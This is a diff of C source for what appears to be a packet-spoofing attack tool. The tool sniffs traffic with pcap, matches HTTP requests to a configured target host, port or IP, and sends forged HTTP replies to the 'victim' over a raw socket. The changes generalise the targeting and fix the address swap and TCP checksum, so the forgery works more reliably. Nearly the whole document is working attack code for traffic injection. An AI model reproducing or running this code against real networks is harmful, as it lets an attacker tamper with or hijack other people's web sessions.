@@ -6,6 +6,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <inttypes.h>
 
 #include "decode-ethernet.h"
 #include "decode-udp.h"
@@ -21,7 +22,7 @@ AttackConfig *config;
 
 void send_raw_ip_packet(int sock, u_char *ip, int n, struct sockaddr_in dstInfo) {
 	int r = sendto(sock , ip, n , 0 , (struct sockaddr *) &dstInfo, sizeof (dstInfo));
-	if (r >=0) printf( " Sent a packet of size : %d\n ", r) ;
+	if (r > 0) printf( " Sent a packet of size : %d\n ", r) ;
 	else printf( "Failed to send packet.\n" ) ;
 }
 
@@ -45,27 +46,18 @@ void spoof_reply_http(ipheader *ip) {
 
 	/* Swap src and dst info */		
 	printf("Receive dest port %d \n",ntohs(tcpReceive->th_dport));
-	unsigned int srcIp = (ip->iph_dstip).s_addr;	// Swap src and dst ip
-	
-	unsigned int dstIp = (ip->iph_srcip).s_addr;
 	printf("Reveive source port %d \n",ntohs(tcpReceive->th_sport));
-
-	//printf("seq %d\n",tcpReceive -> th_seq);
 	printf("seq %" PRIu32 "\n",ntohl(tcpReceive -> th_seq));
-    
-	//printf("ack %d\n",tcpReceive -> th_ack);
 	printf("ack %" PRIu32 "\n",ntohl(tcpReceive -> th_ack));
-
-	memcpy(ipData+12, &srcIp, 4);	// Change src ip
-	memcpy(ipData+16, &dstIp, 4);	// Change dst ip
 
 	/* Re-calculate sequence number and ack number */
 	ipheader *ipSend = (ipheader *)ipData;
+	(ipSend -> iph_srcip).s_addr = (ip->iph_dstip).s_addr;
+	(ipSend -> iph_dstip).s_addr = (ip->iph_srcip).s_addr;
 	int IP_HEADER_SEND_LEN = ipSend -> iph_ihl * 4;
 	tcpheader *tcpSend = (tcpheader *) ((u_char *)ipData + IP_HEADER_SEND_LEN);
-
-	//char *dataSend = (char *)  ((u_char *)ipData + 40);
-	/*printf("data send %s\n",dataSend);*/
+	
+	/* Re-calculate sequence number and ack number */
 	tcpSend -> th_sport = tcpReceive->th_dport; // Swap src and dst port 
 	tcpSend -> th_dport = tcpReceive->th_sport;
 
@@ -90,11 +82,11 @@ void spoof_reply_http(ipheader *ip) {
 	/* Dst info to send by raw socket*/
 	struct sockaddr_in dstInfo;
 	dstInfo.sin_family = AF_INET;
-	dstInfo.sin_addr.s_addr = (ip->iph_srcip).s_addr;
-	dstInfo.sin_port = tcpReceive->th_sport;
+	dstInfo.sin_addr.s_addr = (ipSend -> iph_dstip).s_addr;
+	//dstInfo.sin_port = tcpReceive->th_sport;
 
 	/* Re-calculate TCP checksum */
-	tcpSend -> th_sum = calculate_tcp_checksum(ip);
+	tcpSend -> th_sum = calculate_tcp_checksum((ipheader *) ipData);
 
 	/*send sproof IP packet to victim*/
 	send_raw_ip_packet(sock, ipData , n, dstInfo);
@@ -108,26 +100,34 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		int IP_HEADER_LEN = ip -> iph_ihl * 4;
 		//int IP_HEADER_LEN  = 20;
 		switch (ip->iph_proto) {
-
 			case IPPROTO_TCP:	;// TCP protocol
+				//printf("TCP\n");
 				tcpheader *tcp = (tcpheader *) ((u_char *)packet + ETHERNET_HEADER_LEN + IP_HEADER_LEN);
 				uint8_t TCP_HEADER_LEN2 =  tcp->th_offx2 >> 4;
 				TCP_HEADER_LEN2 = TCP_HEADER_LEN2 * 4;
 				char * data = (char *) ((u_char *)tcp + TCP_HEADER_LEN2);
-				char match = 0;
-				if (ntohs(tcp->th_dport)==80 && data != NULL && strlen((char *) data) > 10) {
+				char match = 1;
+				if (config->dport && ntohs(tcp->th_dport) != config->dport) match = 0;
+				else if (config->dst[0] != '\0') {
+					char str[INET_ADDRSTRLEN];
+					inet_ntop(AF_INET, &(ip->iph_dstip), str, INET_ADDRSTRLEN);
+					//printf("Extract IP %s\n", str);
+					if (strcmp(str, config->dst)) match = 0;
+					//else printf("Match!!\n");				
+				}
+				if (match && data != NULL && strlen((char *) data) > 10) {
+					//printf("Parse HTTP\n");
 					httprequest *request = parseRequest(data);
-					//printf("data %s \n", data);
-					if (request != NULL) {
-						//char *token = NULL;
-						//token = strtok(request->host, ":");
-						//printf("data2 %s \n", data);
-						if (!strncmp(request->host,"112.137.129.87",strlen(request->host))) match =1;
+					//printf("Parse HTTP2\n");
+					if (request != NULL && request->host != NULL) {
+						if (config->host[0] != '\0' && strcmp(request->host, config->host)) match = 0;
 						if (match) {
+							//printf("Fake respond!\n");
 							spoof_reply_http(ip);
 						}
 
-					} else printf("invalid HTTP!");
+					}
+					free(request);
 				}
 
 				break;
@@ -145,7 +145,6 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		}
 	} 
 }
-
 
 int main(int argc, char const *argv[])
 {
